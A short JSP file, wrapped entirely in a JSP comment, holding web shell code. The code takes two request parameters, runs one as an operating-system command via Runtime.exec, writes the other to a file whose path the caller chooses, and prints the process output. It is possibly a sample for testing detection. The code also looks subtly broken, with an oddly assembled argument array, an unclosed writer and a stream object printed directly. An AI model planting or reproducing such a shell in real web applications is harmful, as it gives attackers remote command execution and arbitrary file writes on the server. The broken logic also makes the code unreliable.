<%--
<%@page import="java.io.*"%>
<%! String EC(String s, String c) throws Exception { return s; } %>
<%
String cs = "UTF-8";
String z1 = EC(request.getParameter("arbitraryExecutable") + "", cs);
String z2 = EC(request.getParameter("arbitraryContents") + "", cs);
String[] c = { z1.substring(2), z1.substring(0, 2), z2 };
Process p = Runtime.getRuntime().exec(c);
BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));
bw.write(z2);
out.print(p.getInputStream());
%>

--%>